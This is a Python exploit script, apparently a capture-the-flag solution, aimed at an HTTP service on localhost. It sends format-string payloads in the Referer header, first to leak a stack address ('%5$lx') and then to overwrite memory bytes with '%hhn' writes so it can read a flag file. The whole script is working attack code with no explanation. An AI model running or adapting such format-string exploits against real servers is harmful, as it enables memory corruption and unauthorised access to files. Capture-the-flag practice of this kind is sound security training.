#!/usr/bin/python
import sys
import socket
import telnetlib
import time
import re
from struct import pack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return False
    except socket.error as msg:
      return False
    d += dnow
  return d

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvuntil(self, txt):
    return recvuntil(self._sock, txt)

# Base for any of my ROPs.
def dq(v):
  return pack("<Q", v)

def go():
  global HOST
  global PORT

  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  # leak stack address
  payload = b'GET ////flag.html HTTP/1.0\r\n'
  payload += b'Referer: %5$lx\r\n\r\n'

  s.sendall(payload)
  response = s.recv(1024)

  leak = re.search(r"Referer: (.*)", response.decode('UTF-8'))
  leaked_address = int(leak.group(1).ljust(8, '\x00'), 16)
  print("Leaked address: %#x" % leaked_address)

  s.close()

  # read flag
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  payload = b'GET ////flag.html HTTP/1.0\r\n'
  payload += b'Referer: %34c|||%18$hhn|%253c||%19$hhn||%208c%20$hhn||||'
  payload += dq(leaked_address+4)
  payload += dq(leaked_address+5)
  payload += dq(leaked_address+11)
  payload += b'\r\n\r\n'

  s.sendall(payload)
  print(s.recv(1024))
  s.close()

HOST = '127.0.0.1'
PORT = 31084
go()
